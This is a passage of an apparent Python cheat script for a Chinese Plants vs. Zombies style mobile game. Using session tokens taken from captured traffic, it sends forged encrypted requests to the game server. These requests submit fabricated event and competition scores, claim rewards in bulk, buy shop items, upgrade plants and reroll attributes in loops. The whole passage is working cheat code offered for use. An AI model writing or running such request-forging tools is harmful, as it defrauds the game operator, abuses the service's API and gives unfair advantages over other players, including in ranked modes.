    names = [name_map.get(c, str(c)) for c in buy_value]
    print(f"已选择：{names}")
    while True:
        try:
            data = {"req": "V222", "e": {"p": {"st": 1, "rs": 1}, "pi": pi, "rv": "5", "sk": sk, "t": "13", "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            decrypted_response = get_decrypted_data(url, data=response)
            response_json = json.loads(decrypted_response)
            inner_d = response_json.get("e", {}).get("d", {})
            j_data = json.loads(inner_d.get("j", "{}"))
            sis_list = j_data.get("ems", {}).get("sis", [])
            found = False
            for item in sis_list:
                oi_value = item.get("oi")
                if oi_value in buy_value:
                    found = True
                    item_name = name_map.get(oi_value, str(oi_value))
                    data = {"req": "V222", "e": {"p": {"st": 1, "id": oi_value}, "pi": pi, "rv": "5", "sk": sk,"t": "14", "ui": ui}, "ev": 3}
                    encrypted_data, head = get_encrypted_data(data, url)
                    response = _do_post(head, encrypted_data, data)
                    response_data = json.loads(response.text)
                    if response_data.get("r") == 20013:
                        print("当前请求文本已过期，需重新抓包")
                    elif response_data.get("r") == 0:
                        print(f"{item_name}购买成功")
                    else:
                        print("无尽币数量不足")
            if not found:
                print("本次循环未刷新到所选列表")
        except json.JSONDecodeError:
            print("解析响应的JSON数据失败")
        except AttributeError as ae:
            print(f"出现属性错误: {ae}，停止本次运行。")
        user_input = input("\n按回车继续，输入q停止：").strip()
        if user_input.lower() == 'q':
            break
def run_fortieth_first_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req":"V316","e":{"b":"0","n":"","pi":pi,"sk":sk,"ui":ui},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("存档获取成功")
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        zw_list = decrypted_json['e']['d'].get('pl', [])
        for item in zw_list:
            i_value = item['i']
            s_value = item['s']
            found = False
            jieshu_value = None
            for plant_dict in plant_list:
                plant_id = next(iter(plant_dict))
                if int(plant_id) == int(i_value):
                    found = True
                    jieshu_value = plant_dict.get('jieshu')
                    break
            if found:
                s_int = int(s_value)
                jieshu_int = int(jieshu_value)
                if s_int > jieshu_int:
                    item['s'] = jieshu_value
                else:
                    pass
            else:
                print(f"植物编号 {i_value} 在 p_list 中未找到，跳过")
        xdd_list = [111089, 111087, 111035, 111030, 111022, 111019, 1093, 1039, 1012, 1099, 200157]
        rp_list = []
        i_to_s = {}
        for item in zw_list:
            i_str = item.get('i')
            s_str = item.get('s')
            if i_str is None or s_str is None:
                continue
            try:
                i_int = int(i_str)
                s_int = int(s_str)
                i_to_s[i_int] = s_int
            except ValueError:
                continue
        valid_xdd = []
        for xdd_num in xdd_list:
            if xdd_num in i_to_s:
                valid_xdd.append(xdd_num)
        selected_xdd = random.sample(valid_xdd, min(8, len(valid_xdd)))
        for xdd in selected_xdd:
            s_value = i_to_s[xdd]
            q_value = s_value + 1
            rp_list.append({"i": xdd, "q": q_value})
        data = {"req": "V303", "e": {"al": [{"id": 10896, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            decrypted_response = get_decrypted_data(url, data=response)
            decrypted_json = json.loads(decrypted_response)
            response_data = json.loads(response.text)
            if response_data.get("r") == 0:
                print("关卡刷新成功")
            decrypted_response = get_decrypted_data(url, data=response)
            decrypted_json = json.loads(decrypted_response)
            op_value = decrypted_json["e"]["d"][0].get("op")
            if op_value == 0 or op_value == None:
                print("活动未开启")
            elif op_value == 1:
                data_str = json.loads(decrypted_json['e']['d'][0]['data'])
                all_are_two = True
                for item in data_str['ti']:
                    if item.get('s') != 2:
                        all_are_two = False
                        break
                if all_are_two:
                    print("今日奖励已领取")
                    return
                else:
                    max_limit = max(item['limit'] for item in data_str['ti'])
                    value = math.ceil(max_limit / 10)
                    top_value = "{0:.6f}".format(value)
                    l_value = 0
                    w_value = ""
                    s_value = []
                    s_values = 0
                    r_value = ""
                    hi_list = data_str['hi']
                    for index, item in enumerate(hi_list):
                        lecelInfo = item['lecelInfo']
                        non_zero_count = sum([1 for sub_item in lecelInfo if sub_item['s'] != 0])
                        if index == 0:
                            l_value = non_zero_count if non_zero_count <= 3 else l_value
                            if non_zero_count == 3 and index + 1 < len(hi_list):
                                next_lecelInfo = hi_list[index + 1]['lecelInfo']
                                next_non_zero_count = sum([1 for sub_item in next_lecelInfo if sub_item['s'] != 0])
                                if next_non_zero_count != 0 and next_non_zero_count <= 3:
                                    l_value = next_non_zero_count
                                    if next_non_zero_count == 3 and index + 2 < len(hi_list):
                                        next_next_lecelInfo = hi_list[index + 2]['lecelInfo']
                                        next_next_non_zero_count = sum([1 for sub_item in next_next_lecelInfo if sub_item['s'] != 0])
                                        if next_next_non_zero_count != 0 and next_next_non_zero_count <= 3:
                                            l_value = next_next_non_zero_count
                        s_value.extend([sub_item['s'] for sub_item in lecelInfo])
                    s_values = [i for i in s_value[::-1] if i != 0]
                    if s_values:
                        s_values = s_values[0]
                    random_number = random.randint(10000, 99999)
                    r_value = str(random_number)
                    non_zero_s_count = sum([1 for i in s_value if i != 0])
                    if non_zero_s_count <= 3:
                        w_value = hi_list[0]['name']
                    elif 3 < non_zero_s_count <= 6:
                        w_value = hi_list[1]['name']
                    elif 6 < non_zero_s_count <= 9:
                        w_value = hi_list[2]['name']
                    for i in range(10):
                        data = {"req":"V1094","e":{"p":i,"pi":pi,"r": r_value,"s":top_value,"sk":sk,"ui":ui},"ev": 3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        try:
                            response_data = json.loads(response.text)
                            if response_data.get("r") == 0:
                                print("分数获取成功")
                            else:
                                print("分数获取失败")
                        except json.JSONDecodeError:
                            print("解析响应数据失败")
                        time.sleep(0.2)
                    data = {"req": "V1091", "e": {"l": l_value, "pi": ui, "rp": rp_list, "s": max_limit, "sk": sk, "ui": ui, "w": w_value}, "ev": 3}
                    encrypted_data, head = get_encrypted_data(data, url)
                    response = _do_post(head, encrypted_data, data)
                    response_data = json.loads(response.text)
                    if response_data.get("r") == 0:
                        print("关卡刷分成功")
                        data = {"req": "V303", "e": {"al": [{"id": 10896, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        decrypted_response = get_decrypted_data(url, data=response)
                        decrypted_json = json.loads(decrypted_response)
                        parsed_data = json.loads(decrypted_json['e']['d'][0]['data'])
                        id_list = [item['id'] for item in parsed_data['ti'] if item['s'] == 1]
                        for id_value in id_list:
                            data = {"req": "V1093", "e": {"id": id_value, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
                            encrypted_data, head = get_encrypted_data(data, url)
                            response = _do_post(head, encrypted_data, data)
                            try:
                                response_data = json.loads(response.text)
                                if response_data.get("r") == 0:
                                    print("奖励领取成功")
                                else:
                                    print("奖励领取失败")
                            except json.JSONDecodeError:
                                print("解析响应数据失败")
                            time.sleep(0.2)
                    else:
                        print("关卡刷分失败")
                    time.sleep(0.2)
    else:
        print("存档获取失败")
def run_fortieth_second_script():
    for _ in range(15):
        pi, ui, sk = get_pi_sk(加密)
        data = {"req": "V927", "e": {"fr": {"t": "1", "l": "2", "g": "1", "s": "0", "r": "1","b":"1.000000"},"g": "1","on":"73ce8d5a95ee42399c5fe346ef45f8b0", "pi": pi,"pr": {"pl": [{"i": 111064, "q": 1}, {"i": 111002, "q": 4}, {"i": 1008, "q": 5},{"i": 111029, "q": 5}, {"i": 111029, "q": 5}, {"i": 1041, "q": 1},{"i": 1020, "q": 4}]}, "sk": sk, "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("追击过关成功")
        else:
            print("追击过关失败")

        pi, ui, sk = get_pi_sk(加密)
        data = {"req": "V792", "e": {"ai": "10821", "pi": pi, "sk": sk, "t": "3", "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("袜子领取成功")
        else:
            print("袜子领取失败")
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V792", "e": {"ai": "10821", "pi": pi, "sk": sk, "t": "2", "ui": ui}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("袜子领取成功")
    else:
        print("袜子领取失败")

    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V938", "e": {"n": "31", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("奖励抽取成功")
    else:
        print("奖励抽取失败")
def run_fortieth_third_script():
    pi, ui, sk = get_pi_sk(加密)
    for i in range(25):
        data ={"req": "V831", "e": {"index": 4+i+1, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("双人排位领取成功")
        else:
            print("双人排位领取失败")

def run_fortieth_fourth_script():
    pi, ui, sk = get_pi_sk(加密)
    is_ios = (session.platform == "ios")
    req_code = "V216" if is_ios else "V316"

    # 获取植物数据
    def _get_data():
        data = {"req": req_code, "e": {"b": "0", "n": "", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        return decrypted_json['e']['d']['pcl'], decrypted_json['e']['d']['pl']

    # 植物ID转碎片ID
    def _convert_id(num):
        if num < 2000:
            return num + 100
        elif 100000 < num < 190000:
            return num + 100
        elif 199999 < num < 1000000:
            return num * 10 + 20000000
        else:
            return num

    # 碎片ID转植物ID（用于查名称）
    def _shard_to_plant(num):
        if num < 2100:
            return num - 100
        elif 100000 < num < 190000:
            return num - 100
        elif 199999 < num < 1000000:
            return (num - 20000000) // 10
        else:
            return num

    # 获取植物名称
    def _get_plant_name(oi):
        plant_id = str(_shard_to_plant(oi))
        plant_info = formatted_plant.get(plant_id, {})
        if not plant_info:
            plant_info = formatted_plant.get(str(oi), {})
        return plant_info.get("name", f"植物({oi})")

    # 根据错误码获取失败原因
    def _get_fail_reason(r_code):
        if r_code == 21705:
            return "营养液不足"
        elif r_code == 20728:
            return "碎片不足"
        elif r_code == 20729:
            return "已达最高阶"
        elif r_code == 20013:
            return "请求文本已过期"
        else:
            return f"错误码{r_code}"

    pcl_list, pl_list = _get_data()

    # ===== 第一步：植物激活（V229，碎片>=10） =====
    a_value = [int(item["i"]) if isinstance(item["i"], str) else item["i"] for item in pl_list]
    new_a_value = [_convert_id(num) for num in a_value]
    oi_value = []
    for item in pcl_list:
        q_value = int(item["q"]) if isinstance(item["q"], str) and item["q"].isdigit() else item["q"]
        if 10 <= q_value:
            oi_value.append(int(item["i"]))
    result = [num for num in oi_value if num not in new_a_value]
    for oi in result:
        data = {"req": "V229", "e": {"oi": oi, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        r_code = response_data.get("r")
        pname = _get_plant_name(oi)
        if r_code == 0:
            print(f"{pname} 激活成功")
        else:
            print(f"{pname} 激活失败 {_get_fail_reason(r_code)}")

    # ===== 第二步：植物升阶（V231，oi直接用碎片ID） =====
    excluded_plants = [111145, 111147, 111133, 111123, 22000340, 22000510, 22000580, 22000600, 22000700, 111170, 22000830]
    for i in range(4):
        pcl_list, pl_list = _get_data()

        # 按阶数分组
        value_lists = [[], [], [], []]
        for item in pl_list:
            s = int(item["s"]) if isinstance(item["s"], str) else item["s"]
            if 0 <= s <= 3:
                value_lists[s].append(int(item["i"]))

        # 植物ID转碎片ID
        new_value_lists = [[_convert_id(num) for num in lst] for lst in value_lists]
        new_i_value, new_ii_value, new_iii_value, new_iv_value = new_value_lists

        # 碎片按阈值分组（30/50/50/80）
        th_value, fo_value, foi_value, fi_value = [], [], [], []
        for item in pcl_list:
            q_value = int(item["q"]) if isinstance(item["q"], str) and item["q"].isdigit() else item["q"]
            item_id = int(item["i"])
            if 30 <= q_value:
                th_value.append(item_id)
            if 50 <= q_value:
                fo_value.append(item_id)
                foi_value.append(item_id)
            if 80 <= q_value:
                fi_value.append(item_id)

        # 排除特定植物
        th_value = [num for num in th_value if num not in excluded_plants]
        fo_value = [num for num in fo_value if num not in excluded_plants]
        foi_value = [num for num in foi_value if num not in excluded_plants]
        fi_value = [num for num in fi_value if num not in excluded_plants]

        # 交集
        th_value = [num for num in th_value if num in new_i_value]
        fo_value = [num for num in fo_value if num in new_ii_value]
        foi_value = [num for num in foi_value if num in new_iii_value]
        fi_value = [num for num in fi_value if num in new_iv_value]

        if th_value == [] and fo_value == [] and foi_value == [] and fi_value == []:
            print("暂无可升阶植物")
            break

        # 执行升阶（V231的oi直接用碎片ID，不区分iOS/安卓）
        for oi in th_value:
            data = {"req": "V231", "e": {"oi": oi, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            r_code = response_data.get("r")
            pname = _get_plant_name(oi)
            if r_code == 0:
                print(f"{pname} 升阶成功")
            else:
                print(f"{pname} 升阶失败 {_get_fail_reason(r_code)}")
        for oi in fo_value:
            data = {"req": "V231", "e": {"oi": oi, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            r_code = response_data.get("r")
            pname = _get_plant_name(oi)
            if r_code == 0:
                print(f"{pname} 升阶成功")
            else:
                print(f"{pname} 升阶失败 {_get_fail_reason(r_code)}")
        for oi in foi_value:
            data = {"req": "V231", "e": {"oi": oi, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            r_code = response_data.get("r")
            pname = _get_plant_name(oi)
            if r_code == 0:
                print(f"{pname} 升阶成功")
            else:
                print(f"{pname} 升阶失败 {_get_fail_reason(r_code)}")
        for oi in fi_value:
            data = {"req": "V231", "e": {"oi": oi, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            r_code = response_data.get("r")
            pname = _get_plant_name(oi)
            if r_code == 0:
                print(f"{pname} 升阶成功")
            else:
                print(f"{pname} 升阶失败 {_get_fail_reason(r_code)}")

def run_fortieth_fifth_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V303", "e": {"al": [{"id": 10893, "abi": 0, "type": 1, "config_version": 1}], "ci": "0", "cs": "0", "pack": 渠道, "pi": pi, "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("请求文本已过期")
    elif response_data.get("r") == 0:
        print("趣味竞赛刷新成功")
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        op_value = decrypted_json["e"]["d"][0].get("op")
        if op_value == 0 or op_value == None:
            print("活动未开启")
        elif op_value == 1:
            data_str = decrypted_json['e']['d'][0]['data']
            game_data = json.loads(data_str)
            game_list = game_data['gameList']
            op1_game_ids = [item['id'] for item in game_list if item.get('op') == 1]
            all_reward_status_1 = all(item.get('status') == 1 for item in game_data['scoreReward'])
            all_game_op_1 = all(item.get('op') == 1 for item in game_list)
            final_op1_game_ids = op1_game_ids if not all_reward_status_1 else []
            reward_zero_status_indices = [idx for idx, item in enumerate(game_data['scoreReward']) if item.get('status') == 0] if all_game_op_1 else []
            for id in final_op1_game_ids:
                data ={"req": "V1070", "e": {"id": id, "pi": pi, "score": "20000", "sk": sk, "type": "1", "ui": ui}, "ev": 3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 20013:
                    print("当前请求文本已过期，需重新抓包")
                elif response_data.get("r") == 0:
                    print("竞赛简单刷分成功")
                else:
                    print("竞赛简单刷分失败")
                data ={"req": "V1070", "e": {"id": id, "pi": pi, "score": "20000", "sk": sk, "type": "2", "ui": ui}, "ev": 3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 20013:
                    print("当前请求文本已过期，需重新抓包")
                elif response_data.get("r") == 0:
                    print("竞赛困难刷分成功")
                else:
                    print("竞赛困难刷分失败")
            for id in reward_zero_status_indices:
                data ={"req": "V1071", "e": {"id": id, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 20013:
                    print("当前请求文本已过期，需重新抓包")
                elif response_data.get("r") == 0:
                    print("竞赛奖励领取成功")
                else:
                    print("竞赛奖励领取失败")
                time.sleep(0)
    else:
        print("趣味竞赛刷新失败")

def run_fortieth_seventh_script():
    pi, ui, sk = get_pi_sk(加密)
    while True:
        data = {"req":"V303","e":{"al":[{"id":10882,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"sk":sk,"ui":ui,"v":版本号},"ev":3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        data_content = decrypted_json['e']['d'][0]['data']
        if isinstance(data_content, str):
             data_dict = json.loads(data_content)
        else:
             data_dict = data_content
        task_values = data_dict.get('task', [])
        result = [item['type'] for item in task_values if item['status'] != 1]
        print(result)
        if result:
            for t_value in result:
                new_data =  {"req":"V406","e":{"pi":pi,"sk":sk,"t":t_value,"ui":ui},"ev":3}
                encrypted_data, head = get_encrypted_data(new_data, url)
                response = _do_post(head, encrypted_data, new_data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 20013:
                     print("当前请求文本已过期，需重新抓包")
                elif response_data.get("r") == 0:
                     print("任务获取成功")
                else:
                     print("任务获取失败")
            data = {"req":"V303","e":{"al":[{"id":10882,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"sk":sk,"ui":ui,"v":版本号},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            decrypted_response = get_decrypted_data(url, data=response)
            decrypted_json = json.loads(decrypted_response)
            data_content = decrypted_json['e']['d'][0]['data']
            if isinstance(data_content, str):
                data_dict = json.loads(data_content)
            else:
                data_dict = data_content
        else:
            pass
        coin_num = data_dict['coin_num']
        print(f"\n当前兑换币数量: {coin_num}\n")
        si_data = data_dict['int_gift_list']
        processed_items = []
        for idx, item in enumerate(si_data, start=1):
            gift_id = str(item["i"])
            gift_info = formatted_plant.get(gift_id, {"name": f"未知物品({gift_id})", "pinzhi": "default"})
            gift_color = pinzhi_to_color.get(gift_info["pinzhi"], pinzhi_to_color["default"])
            colored_gift_name = f"{gift_color}{gift_info['name']}{RESET_COLOR}"
            bought = item["q"]
            limit = item["c"]
            coin = item["int"]
            line = (f"{idx}. {colored_gift_name}×{bought} 单价{coin} 剩余次数{limit}\n")
            print(line)
        key = input("\n请输入要购买的序号（1-{}），输入空回车结束：")
        if key == "":
            return
        value = input("\n请输入要购买的数量，输入空回车结束：")
        if value== "":
            return
        else:
            for i in range(int(value)):
                data = {"req":"V407","e":{"key":int(key) - 1,"pi":pi,"sk":sk,"ui":ui},"ev":3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 0:
                    print("购买成功")
                else:
                    print("购买失败")
                    break
            time.sleep(0)
def run_fortieth_eighth_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V303", "e": {"al": [{"id": 10892, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("请求文本已过期")
    elif response_data.get("r") == 0:
        print("同游刷新成功")
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        op_value = decrypted_json["e"]["d"][0].get("op")
        if op_value == 0 or op_value == None:
            print("活动未开启")
        elif op_value == 1:
            for i in range(11):
                data = {"req": "V1053", "e": {"k": i, "pi": pi, "sk": sk, "t": "1", "ui": ui}, "ev": 3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 20013:
                    print("当前请求文本已过期，需重新抓包")
                elif response_data.get("r") == 0:
                    print("获取成功")
                else:
                    print("获取失败")
                time.sleep(0)
            data = {"req": "V303", "e": {"al": [{"id": 10892, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            decrypted_response = get_decrypted_data(url, data=response)
            decrypted_json = json.loads(decrypted_response)
            data_str = decrypted_json['e']['d'][0]['data']
            data = json.loads(data_str)
            ri_list = []
            yue_list = []
            ge_list = []
            tasks = data.get('task', [])
            for task in tasks:
                s_val = task.get('s')
                t_val = task.get('t')
                if s_val == 0 and t_val == 0:
                    yue_list.append(task['id'])
                elif t_val is None and s_val == 0:
                    ri_list.append(task['id'])
            task_persons = data.get('taskPerson', [])
            for person in task_persons:
                if person.get('s') != 2:
                    ge_list.append(person['id'])
            print(ge_list)
            for k1i in ri_list:
                data = {"req": "V1053", "e": {"k": int(k1i)-1001, "pi": pi, "sk": sk, "t": "1", "ui": ui}, "ev": 3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                try:
                    response_data = json.loads(response.text)

                    if response_data.get("r") == 20013:
                        print("当前请求文本已过期，需重新抓包")
                    elif response_data.get("r") == 0:
                        print("奖励领取成功")
                    else:
                        print("奖励领取失败")
                except json.JSONDecodeError:
                    print("解析响应数据失败")
                time.sleep(0)
            for k2i in yue_list:
                data = {"req": "V1053", "e": {"k": int(k2i)-1001, "pi": pi, "sk": sk, "t": "3", "ui": ui}, "ev": 3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 20013:
                    print("当前请求文本已过期，需重新抓包")
                elif response_data.get("r") == 0:
                    print("奖励领取成功")
                else:
                    print("奖励领取失败")
                time.sleep(0)
            for k3i in ge_list:
                data = {"req": "V1053", "e": {"k": int(k3i)-1001, "pi": pi, "sk": sk, "t": "4", "ui": ui}, "ev": 3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 20013:
                    print("当前请求文本已过期，需重新抓包")
                elif response_data.get("r") == 0:
                    print("奖励领取成功")
                else:
                    print("奖励领取失败")
                time.sleep(0)
    else:
        print("同游刷新失败")
    time.sleep(0)

def run_fortieth_ninth_script():
    pi, ui, sk = get_pi_sk(加密)
    print("""
 1. 新人组
 2. 光芒万丈
 3. 不动如山
 4. 真能打
 6. 火力全开
 7. 冰力四射
 8. 雷霆万钧
 9. 能量武器
 10. 精英豌豆
 11. 军火库
 12. 三分王
 13. 神射手
 14. 百步穿僵
 15. 人多力量大
 17. 暗影家族
 18. 环保卫士
 19. 文艺青年
 20. 忍者小队
 21. 大厨组合
 22. 摧枯拉朽
 23. 坚固防线
 24. 控场大师
 25. 魔法大师
 26. 枝繁叶茂
 27. 十二生肖
 28. 繁花似锦
 29. 打飞他们
 30. 十万伏特
 31. 动物世界
 32. 炸个痛快
 33. 小心脚下
 34. 惊声尖笑
 35. 运动健将
 36. 不如跳舞
 37. 头有点晕
 38. 酸甜苦辣
 39. 武林对决
 40. 地爆天星
 41. 光暗交织
 42. 亿点控制
 43. 冰与火
 44. 未来科技
 45. 花开富贵
 46. 火力压制
 47. 群卜荟萃
 48. 狂欢派对
 49. 过载电流
 50. 来自深渊
 51. 乘风破浪
""")
    search_fi = str((int(input("请输入要刷的家族: ")) + 50000))
    data = {"req":"V325","e":{"fi":search_fi,"pi":pi,"sk":sk,"ui":ui},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("二词条解锁成功")
    elif response_data.get("r") == 28024:
        print("二词条已解锁")
    else:
        print("未知错误")
    data = {"req": "V326", "e": {"ad": 0, "f": 0, "fi": search_fi, "l": "", "lv": 0, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    result = None
    for item in decrypted_json['e']['d']['fl']:
        if str(item['fi']) == search_fi:
            result = item
            break
    if result:
        first_t = result['c'][0].get('t')
        first_n = result['c'][0].get('n')
        second_t = result['c'][1].get('t')
        second_n = result['c'][1].get('n')

        translation_dict = {
            "extra_attack": "攻击力增加",
            "improved_atk_rate": "攻击速度增加",
            "improved_sunproduce_rate": "生产速度增加",
            "fast_plant": "种植冷却缩短",
            "extra_sunmoney_25": "额外产出25阳光",
            "extra_sunmoney_50": "额外产出50阳光",
            "extra_hitpoints": "生命值增加",
            "extra_defend": "防御力增加",
            "regeneration": "每5秒恢复生命",
            "improved_explode_damage": "爆炸伤害增加",
            "improved_lightning_damage": "闪电伤害增加",
            "improved_flame_damage": "火焰伤害增加",
            "improved_cold_damage": "冰冻伤害增加",
            "extra_melee_attack": "近战伤害增加",
            "lower_cost": "阳光消耗降低",
            "invincible": "无敌3秒概率",
            "ghost": "灵魂状态概率",
            "plant_sun_refund": "返还阳光概率"
        }
        print("当前该家族的词条为:")
        print(translation_dict.get(first_t, first_t))
        print(first_n)
        print(translation_dict.get(second_t, second_t))
        print(second_n)
    if result:
        l1_value = result['c'][1]['m']
        l2_value = result['c'][0]['m']
    else:
        print("未找到匹配的项")
    keys = {
        '1': "extra_attack",
        '2': "improved_atk_rate",
        '3': "improved_sunproduce_rate",
        '4': "fast_plant",
        '5': "extra_sunmoney_25",
        '6': "extra_sunmoney_50",
        '7': "extra_hitpoints",
        '8': "extra_defend",
        '9': "regeneration",
        '10': "improved_explode_damage",
        '11': "improved_lightning_damage",
        '12': "improved_flame_damage",
        '13': "improved_cold_damage",
        '14': "extra_melee_attack",
        '15': "lower_cost",
        '16': "invincible",
        '17': "ghost",
        '18': "plant_sun_refund"
    }
    level = input("请输入该家族的等级: ")
    print("""
  5.额外产出25阳光
  6.额外产出50阳光
 16.无敌3秒概率
 18.返还阳光概率""")
    first_choice = input("请输入第一个词条对应的整数: ")
    first_value = keys.get(first_choice, "无效选择")
    try:
        first_min = float(input("请输入第一个词条的最低数值(填小数): "))
        first_max = float(input("请输入第一个词条的最高数值(填小数): "))
        first_values = (first_min, first_max)
    except ValueError:
        first_values = "输入的不是有效的数值"

    second_choice = input("请输入第二个词条对应的整数: ")
    second_value = keys.get(second_choice, "无效选择")
    try:
        second_min = float(input("请输入第二个词条的最低数值(填小数): "))
        second_max = float(input("请输入第二个词条的最高数值(填小数): "))
        second_values = (second_min, second_max)
    except ValueError:
        second_values = "输入的不是有效的数值"
    while True:
        data = {"req": "V326", "e": {"ad": 0, "f": 0, "fi": search_fi, "l": l1_value, "lv": level, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        result = None
        for item in decrypted_json['e']['d']['fl']:
